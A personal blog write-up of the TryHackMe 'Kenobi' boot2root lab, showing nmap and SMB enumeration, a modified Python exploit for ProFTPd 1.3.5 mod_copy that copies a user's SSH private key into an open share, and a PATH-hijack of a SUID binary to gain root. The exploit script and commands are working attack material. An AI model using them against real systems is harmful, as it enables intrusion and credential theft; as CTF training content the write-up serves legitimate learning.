+++
title = "Kenobi Boot2Root Write-Up"
date = '2020-11-14'
author = "Nate Catelli"
tags = [
    "ctf", "boot2root", "hacking", "writeup", "tryhackme"
]
description = 'A boot2root writeup of the Kenobi host from TryHackMe'
draft = false
+++

## Introduction

The Kenobi boot2root challenge was a ton of fun because it required multiple pivots to learn enough to leak a key. On my first pass, I overlooked the NFS server which really impressed the importance of carefully reviewing scans.

## Environment

The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the the target host which I knew contained 2 flags to capture. Nothing else was known about the host prior to the attack other than that the host was most likely a Linux server.

## Attacking Kenobi

Since I knew I would be attacking a single target, I exported the host's IP to the environment variable `ATTACKTARGET`. I've also modified a few scans for the single host case by doing things such as disabling pings.

### Host Enumeration

I began the attack by opening up a new tmux session and starting a few nmap scans to get a feel for the lay of the land. I started with a SYN, OS and Service Version scan.

```bash
root@kali:~# mkdir scans
root@kali:~# cd scans/
root@kali:~/scans# nmap -sS -sV -O -Pn -oA $ATTACKTARGET $ATTACKTARGET 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 22:18 UTC
Nmap scan report for ip-10-10-221-157.eu-west-1.compute.internal (10.10.221.157)
Host is up (0.00043s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:98:C4:09:75:23 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/14%OT=21%CT=1%CU=41956%PV=Y%DS=1%DC=D%G=Y%M=0298C4%
OS:TM=5FB057C7%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=I%II=
OS:I%TS=8)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11
OS:NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=
OS:68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 25.27 second
```

This scan uncovered a great deal of information about the host. It appeared to be an Ubuntu linux distro, running sambda, proftpd, and a webserver, each of which represented a viable path for investigation. I started by opening firefox to see what the website it was serving looked like.

![Kenobi site index](/img/kenobi_http_index.png)

I tried a few different URLs for fun and ended up getting lucky with `robots.txt` which pointed out that there was a static `admin.html` page.

![Kenobi site admin](/img/kenobi_http_admin.png)

Given that there were a few other targets, I decided to look into those before enumerating the webserver further. Samba seemed like a reasonable next choice and I began by enumerating both shares and users using two of the smb scripts provided with nmap.

```bash
root@kali:~/scans# nmap --script=smb-enum-shares.nse,smb-enum-users.nse -p 445 -oA smb $ATTACKTARGET 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 22:22 UTC
Nmap scan report for ip-10-10-221-157.eu-west-1.compute.internal (10.10.221.157)
Host is up (0.00018s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:98:C4:09:75:23 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.221.157\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.221.157\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.221.157\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 0.58 second
```

This scan exposed a potential `kenobi` user and also identified an anonymous share. I connected to that share and was lucky to find a `logs.txt` file that turned out to be a gold mine, exposing the `kenobi` user and a path to an SSH key. This also contained a possibly up-to-date copy of the samba config file that pointed to where the users home directory and the samba share were.

```bash
smb: \> get log.txt 
getting file \log.txt of size 12237 as log.txt (1991.7 KiloBytes/sec) (average 1991.7 KiloBytes/sec)
root@kali:~# cat log.txt | head -n 7
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.

root@kali:~# cat log.txt | grep '\[anonymous\]' -A5
[anonymous]
   path = /home/kenobi/share
   browseable = yes
   read only = yes
   guest ok = yes
```

Finally, I decided to probe around on the FTP server, which didn't appear to have anonymous logins. With a few services, a bit of a map of the environment and some service versions in hand, I ran a few search queries through `searchsploit` before landing on the following exploits for `ProFTPd 1.3.5`.

```bash
root@kali:~# searchsploit 1.3.5 -w | grep -i proftpd 
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | https://www.exploit-db.com/exploits/37262
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution       | https://www.exploit-db.com/exploits/36803
ProFTPd 1.3.5 - File Copy                                 | https://www.exploit-db.com/exploits/36742
root@kali:~# mkdir exploit && cd exploit/
```

### Preparing an attack

These exploits allowed me to arbitrarily copy files around on the filesystem. Since I had a key and a few points of exfiltration, it seemed worth attempting. The second option in the list, exploit `36803`, included a python script that I modified to accept a source and destination argument. I then used the exploit to move the `kenobi` user's ssh key into the samba share. I've included the modified script below.

```python
import socket
import sys

if(len(sys.argv) < 4):
    print('\n Usage : exploit.py server directory cmd')
else:
    server = sys.argv[1] # vulnerable server
    src = sys.argv[2] # source file to move
    dest = sys.argv[3] # new destination of source file

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server, 21))
        s.recv(1024)
        print('[ + ] Connected to server [ + ]\n')
        s.send(f'site cpfr {src} \n'.encode())
        s.recv(1024)
        s.send(f'site cpto {dest} \n'.encode())
        s.recv(1024)
```

```bash
root@kali:~/exploit# python3 exploit.py $ATTACKTARGET '/home/kenobi/.ssh/id_rsa' '/home/kenobi/share/id_rsa'
[ + ] Connected to server [ + ]

root@kali:~# smbclient //$ATTACKTARGET/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Nov 15 00:53:15 2020
  ..                                  D        0  Wed Sep  4 10:56:07 2019
  id_rsa                              N     1675  Sun Nov 15 00:53:15 2020
  log.txt                             N    12237  Wed Sep  4 10:49:09 2019

  9204224 blocks of size 1024. 6877112 blocks available
smb: \> get id_rsa 
getting file \id_rsa of size 1675 as id_rsa (817.8 KiloBytes/sec) (average 817.9 KiloBytes/sec)
smb: \> 
root@kali:~# mv id_rsa ~/.ssh/kenobi && chmod 600 ~/.ssh/kenobi
root@kali:~# ssh kenobi@$ATTACKTARGET -i ~/.ssh/kenobi 
load pubkey "/root/.ssh/kenobi": invalid format
The authenticity of host '10.10.221.157 (10.10.221.157)' can't be established.
ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.221.157' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$
```

Success! I had a local account on the host!

#### Escalating privileges

I began to poke around on the host and managed to find a flag `user.txt` sitting in kenobi's home directory. I followed my usual CTF local enumerating steps, which included checking the host version, sudo privs, etc... when I'd noticed a binary I wasn't familiar with when checking for files with the SUID bits set. I've truncated the output a bit for clarity.

```bash
kenobi@kenobi:~$ find / -perm -4000 -type f 2>/dev/null
/sbin/mount.nfs
...
/usr/bin/menu
...
/bin/ping6
```

Running this `menu` command prompted for an option and then output a corresponding status check of the site, network configuration information or the kernel version. I then fed the command through strings to validate that it was shelling out and was pleased to find that it called out to both `curl` and `uname`.

```bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ strings /usr/bin/menu | egrep 'curl|uname|ifconifg'
curl -I localhost
uname -r
```

With this information I decided to try a PATH hijacking attack by creating an executable binary in the kenobi user's local path which, when ran, would invoke `/bin/bash`. I then overrode the kenobi user's PATH to place its local `~/bin/` directory at the highest priority and attempted to rerun the kernel version `menu` command again.

```bash
kenobi@kenobi:~$ mkdir bin
kenobi@kenobi:~$ echo '/bin/bash' > bin/uname
kenobi@kenobi:~$ chmod +x bin/uname 
kenobi@kenobi:~$ export PATH=~/bin/:$PATH
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:~# 
```

Success! This elevated me to a root shell and quickly I found the last flag sitting in the `/root/` directory.

```bash
root@kenobi:/# cd /root/
root@kenobi:/root# ls
root.txt
```

## Summary

This attack reinforced how much discipline is necessary when reading through exfiltrated information. There were mountains of information made available in scans and files laying around that, if they weren't reiterated as often as they were, could have easily been missed. A perfect example of this is how I missed the NFS server listening on port 111, which I only found on my second pass through the host.
